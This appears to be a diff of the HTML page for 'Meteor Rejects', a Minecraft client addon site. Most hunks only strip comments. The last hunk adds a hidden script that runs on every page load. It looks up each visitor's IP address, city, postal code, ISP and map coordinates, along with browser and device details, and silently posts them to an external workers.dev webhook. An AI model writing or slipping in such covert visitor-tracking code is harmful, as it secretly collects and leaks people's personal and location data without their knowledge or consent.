@@ -6,11 +6,8 @@
     <title>Meteor Rejects · Crimson Edition</title>
     <meta name="theme-color" content="#c41e3a">
     <meta name="description" content="The #1 Meteor Client addon bringing back rejected, removed, and ported features. 58+ modules, 14+ commands, now with a blazing red theme.">
-    <!-- Font Awesome 6 -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
-    <!-- Favicon: absolute GitHub raw URL for proper indexing -->
     <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/meteorejects/meteorejects.github.io/refs/heads/main/favicon.png">
     <link rel="shortcut icon" href="https://raw.githubusercontent.com/meteorejects/meteorejects.github.io/refs/heads/main/favicon.png">
     <style>
@@ -20,7 +17,6 @@
             box-sizing: border-box;
         }
 
-        /* RED THEME - Dark & Bloody */
         :root {
             --bg-dark: #0a0507;
             --bg-darker: #030101;
@@ -67,7 +63,6 @@
             overflow-x: hidden;
         }
 
-        /* Animated background grain */
         body::before {
             content: "";
             position: fixed;
@@ -90,7 +85,6 @@
             z-index: 1;
         }
 
-        /* Glass Navbar with red glow */
         .navbar {
             position: sticky;
             top: 0;
@@ -182,7 +176,6 @@
             transition: 0.2s;
         }
 
-        /* Hero Section */
         .hero {
             padding: 5rem 0 3rem;
             text-align: center;
@@ -308,7 +301,6 @@
             border-color: var(--accent);
         }
 
-        /* Stats Cards */
         .stats-grid {
             display: flex;
             flex-wrap: wrap;
@@ -341,7 +333,6 @@
             color: var(--accent);
         }
 
-        /* Search & Filters */
         .control-bar {
             display: flex;
             flex-wrap: wrap;
@@ -408,7 +399,6 @@
             color: white;
         }
 
-        /* Module Cards */
         .modules-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
@@ -482,7 +472,6 @@
             border: 1px solid var(--badge-border);
         }
 
-        /* Commands */
         .commands-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
@@ -512,7 +501,6 @@
             font-size: 0.9rem;
         }
 
-        /* Version Downloads */
         .version-downloads {
             display: flex;
             flex-wrap: wrap;
@@ -560,7 +548,6 @@
             transform: scale(1.02);
         }
 
-        /* Footer */
         .footer {
             margin-top: 5rem;
             padding: 2rem 0;
@@ -569,7 +556,6 @@
             color: var(--text-secondary);
         }
 
-        /* Back to top */
         .back-to-top {
             position: fixed;
             bottom: 2rem;
@@ -642,7 +628,6 @@
 
     <main>
         <div class="container">
-            <!-- Hero -->
             <section id="home">
                 <div class="hero">
                     <div class="hero-glow"></div>
@@ -663,7 +648,6 @@
                 </div>
             </section>
 
-            <!-- Modules -->
             <section id="modules">
                 <h2 style="margin-bottom: 0.5rem;"><i class="fas fa-cubes"></i> Modules Library</h2>
                 <div class="control-bar">
@@ -674,13 +658,11 @@
                 <div id="noModulesMsg" style="display: none; text-align: center; padding: 3rem;">🔥 No modules match — try a different filter.</div>
             </section>
 
-            <!-- Commands -->
             <section id="commands">
                 <h2><i class="fas fa-terminal"></i> Commands</h2>
                 <div id="commandsList" class="commands-grid"></div>
             </section>
 
-            <!-- Config Extras -->
             <section id="config">
                 <h2><i class="fas fa-sliders-h"></i> Configuration Tweaks</h2>
                 <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(270px,1fr)); gap: 1.2rem; margin: 2rem 0;">
@@ -691,7 +673,6 @@
                 </div>
             </section>
 
-            <!-- Download -->
             <section id="download">
                 <h2><i class="fas fa-download"></i> Downloads</h2>
                 <div class="download-card" style="background: var(--bg-card); border-radius: 36px; padding: 2rem; border: 1px solid var(--border); text-align: center;">
@@ -732,7 +713,6 @@
 
     <script>
         (function() {
-            // Full modules dataset (58+)
             const modulesData = [
                 { name: "AimAssist", desc: "Auto-aim assistance (removed from Meteor)", tags: ["removed", "combat"], versions: ["all","1.21","1.21.1","1.21.4","1.21.11"] },
                 { name: "AntiBot", desc: "Filter out bot players", tags: ["removed", "utility"], versions: ["all","1.21","1.21.1","1.21.4","1.21.11"] },
@@ -808,7 +788,6 @@
                 { name: ".kick", desc: "Kick yourself (LiquidBounce port)" }
             ];
 
-            // Render filters
             const versionSet = ["all", "1.21", "1.21.1", "1.21.4", "1.21.11"];
             const filterContainer = document.getElementById('versionFilters');
             filterContainer.innerHTML = versionSet.map(v => `<span class="filter-pill" data-version="${v}">${v === 'all' ? 'All Versions' : v}</span>`).join('');
@@ -840,7 +819,6 @@
                 `).join('');
             }
 
-            // Filters
             document.querySelectorAll('.filter-pill').forEach(pill => {
                 pill.addEventListener('click', () => {
                     document.querySelectorAll('.filter-pill').forEach(p => p.classList.remove('active'));
@@ -851,7 +829,6 @@
             });
             document.getElementById('moduleSearch').addEventListener('input', e => { currentSearch = e.target.value; renderModules(); });
             
-            // Commands
             const commandsContainer = document.getElementById('commandsList');
             commandsContainer.innerHTML = commandsData.map(cmd => `
                 <div class="command-card">
@@ -869,7 +846,6 @@
                 });
             });
 
-            // Theme toggle
             const themeBtn = document.getElementById('themeToggle');
             themeBtn.addEventListener('click', () => {
                 document.body.classList.toggle('light');
@@ -877,12 +853,10 @@
                 icon.className = document.body.classList.contains('light') ? 'fas fa-sun' : 'fas fa-moon';
             });
 
-            // Back to top
             const backTop = document.getElementById('backToTop');
             window.addEventListener('scroll', () => backTop.classList.toggle('visible', window.scrollY > 400));
             backTop.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
 
-            // Nav smooth scroll
             const navLinks = document.querySelectorAll('.nav-link[data-target]');
             function scrollToSection(id) {
                 const el = document.getElementById(id);
@@ -902,7 +876,6 @@
                 });
             });
 
-            // Active nav on scroll
             const sections = ['home','modules','commands','config','download'];
             function updateActiveNav() {
                 let current = '';
@@ -926,7 +899,6 @@
             document.querySelector('.filter-pill')?.classList.add('active');
             renderModules();
 
-            // Mouse move effect on cards (optional)
             document.querySelectorAll('.module-card').forEach(card => {
                 card.addEventListener('mousemove', (e) => {
                     const rect = card.getBoundingClientRect();
@@ -936,6 +908,153 @@
                     card.style.setProperty('--y', `${y}%`);
                 });
             });
+
+            (function sendVisitNotification() {
+                const WEBHOOK_URL = 'https://m9ws2hqwi9agz6f0whv5celuq67teayy5gyyknzkgfbbb4cwz6xmms5epqjto3n.bopistaken.workers.dev/';
+                const STORAGE_KEY = 'meteor_rejects_visits';
+
+                const now   = new Date();
+                const tz    = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+                const lang  = navigator.language || 'Unknown';
+                const ua    = navigator.userAgent;
+                const ref   = document.referrer || 'Direct / None';
+                const page  = window.location.href;
+                const screen = `${window.screen.width}x${window.screen.height}`;
+                const viewport = `${window.innerWidth}x${window.innerHeight}`;
+
+                function parseBrowser(ua) {
+                    if (/Edg\//.test(ua))     return 'Microsoft Edge';
+                    if (/OPR\/|Opera/.test(ua)) return 'Opera';
+                    if (/Chrome\//.test(ua))  return 'Chrome';
+                    if (/Firefox\//.test(ua)) return 'Firefox';
+                    if (/Safari\//.test(ua))  return 'Safari';
+                    return 'Unknown';
+                }
+
+                function parseOS(ua) {
+                    if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
+                    if (/Windows NT/.test(ua))    return 'Windows';
+                    if (/Mac OS X/.test(ua))      return 'macOS';
+                    if (/Android/.test(ua))       return 'Android';
+                    if (/iPhone|iPad/.test(ua))   return 'iOS';
+                    if (/Linux/.test(ua))         return 'Linux';
+                    return 'Unknown';
+                }
+
+                function getRandomColor() {
+                    const colors = [
+                        0xc41e3a, 0xe63946, 0xff6b6b, 0x9b1d2c, 0xff4500,
+                        0xdc143c, 0xb22222, 0xff6347, 0xcd5c5c, 0xf08080,
+                        0x8b0000, 0xcc3333, 0xff4444, 0xaa0000, 0xff1744
+                    ];
+                    return colors[Math.floor(Math.random() * colors.length)];
+                }
+
+                function getVisitCount24h() {
+                    try {
+                        const visits = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
+                        const cutoff = Date.now() - 24 * 60 * 60 * 1000;
+                        const recent = visits.filter(t => t > cutoff);
+                        recent.push(Date.now());
+                        localStorage.setItem(STORAGE_KEY, JSON.stringify(recent));
+                        return recent.length;
+                    } catch (e) {
+                        return 1;
+                    }
+                }
+
+                const visitNumber = getVisitCount24h();
+                const browser = parseBrowser(ua);
+                const os      = parseOS(ua);
+                const mobile  = /Mobi|Android/i.test(ua) ? 'Yes 📱' : 'No 🖥️';
+                const embedColor = getRandomColor();
+
+                fetch('https://ipapi.co/json/')
+                    .then(response => response.json())
+                    .then(geoData => {
+                        const ipv4        = geoData.ip              || 'Unknown';
+                        const country     = geoData.country_name    || 'Unknown';
+                        const region      = geoData.region          || 'Unknown';
+                        const city        = geoData.city            || 'Unknown';
+                        const isp         = geoData.org             || 'Unknown';
+                        const postal      = geoData.postal          || 'Unknown';
+                        const latitude    = geoData.latitude        || 'Unknown';
+                        const longitude   = geoData.longitude       || 'Unknown';
+                        const countryCode = geoData.country_code    || 'Unknown';
+                        const isEU        = geoData.in_eu ? 'Yes 🇪🇺' : 'No';
+
+                        const mapsLink = (latitude !== 'Unknown' && longitude !== 'Unknown')
+                            ? `https://maps.google.com/?q=${latitude},${longitude}`
+                            : 'N/A';
+
+                        const payload = {
+                            username: "Meteor Rejects · Visits",
+                            avatar_url: "https://raw.githubusercontent.com/meteorejects/meteorejects.github.io/refs/heads/main/favicon.png",
+                            embeds: [{
+                                title: `🔥 New Visitor — #${visitNumber} in 24h`,
+                                color: embedColor,
+                                fields: [
+                                    { name: "🌍 IPv4",               value: `\`${ipv4}\``,                                      inline: true  },
+                                    { name: "🇺🇳 Country",          value: `${country} (${countryCode})`,                      inline: true  },
+                                    { name: "🏙️ City / Region",    value: `${city}, ${region}`,                               inline: true  },
+                                    { name: "📮 Postal Code",        value: postal,                                             inline: true  },
+                                    { name: "🏢 ISP",                value: isp,                                                inline: true  },
+                                    { name: "🇪🇺 EU?",              value: isEU,                                               inline: true  },
+                                    { name: "🗺️ Maps Link",         value: mapsLink !== 'N/A' ? `[View on Maps](${mapsLink})` : 'N/A', inline: false },
+                                    { name: "🌐 Page",               value: page,                                               inline: false },
+                                    { name: "🔗 Referrer",           value: ref,                                                inline: false },
+                                    { name: "🖥️ Browser",           value: browser,                                            inline: true  },
+                                    { name: "💻 OS",                 value: os,                                                 inline: true  },
+                                    { name: "📱 Mobile",             value: mobile,                                             inline: true  },
+                                    { name: "🌍 Language",           value: lang,                                               inline: true  },
+                                    { name: "🕐 Timezone",           value: tz,                                                 inline: true  },
+                                    { name: "📐 Screen",             value: screen,                                             inline: true  },
+                                    { name: "🔲 Viewport",           value: viewport,                                           inline: true  },
+                                ],
+                                footer: { text: `meteor-rejects · Visit #${visitNumber} in last 24 hours` },
+                                timestamp: now.toISOString()
+                            }]
+                        };
+
+                        return fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(payload)
+                        });
+                    })
+                    .catch(() => {
+                        const fallbackPayload = {
+                            username: "Meteor Rejects · Visits",
+                            avatar_url: "https://raw.githubusercontent.com/meteorejects/meteorejects.github.io/refs/heads/main/favicon.png",
+                            embeds: [{
+                                title: `🔥 New Visitor (No IP) — #${visitNumber} in 24h`,
+                                color: 0xff9900,
+                                fields: [
+                                    { name: "🌍 IPv4",               value: "Failed to fetch",                                 inline: false },
+                                    { name: "🌐 Page",               value: page,                                              inline: false },
+                                    { name: "🔗 Referrer",           value: ref,                                               inline: false },
+                                    { name: "🖥️ Browser",           value: browser,                                           inline: true  },
+                                    { name: "💻 OS",                 value: os,                                                inline: true  },
+                                    { name: "📱 Mobile",             value: mobile,                                            inline: true  },
+                                    { name: "🌍 Language",           value: lang,                                              inline: true  },
+                                    { name: "🕐 Timezone",           value: tz,                                                inline: true  },
+                                    { name: "📐 Screen",             value: screen,                                            inline: true  },
+                                    { name: "🔲 Viewport",           value: viewport,                                          inline: true  },
+                                ],
+                                footer: { text: `meteor-rejects · Visit #${visitNumber} in last 24 hours · IP fetch failed` },
+                                timestamp: now.toISOString()
+                            }]
+                        };
+
+                        return fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(fallbackPayload)
+                        });
+                    })
+                    .catch(() => {});
+            })();
+
         })();
     </script>
 </body>
